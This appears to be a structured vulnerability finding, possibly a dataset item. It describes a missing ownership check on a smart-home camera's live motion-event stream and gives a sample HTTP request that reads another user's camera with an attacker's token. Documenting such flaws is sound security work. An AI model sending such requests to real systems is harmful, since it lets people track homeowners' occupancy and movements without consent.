diagnosis: The SSE route streams live motion detection events and video snapshot URLs for cameraId without checking whether req.user owns or resides at the property where the camera is installed. Malicious users can monitor occupancy and physical movements of homeowners.
exploit_request:
GET /api/cameras/cam_front_door_9901/live-events HTTP/1.1
Host: iot.safehome.io
Authorization: Bearer <attacker_token>
Accept: text/event-stream
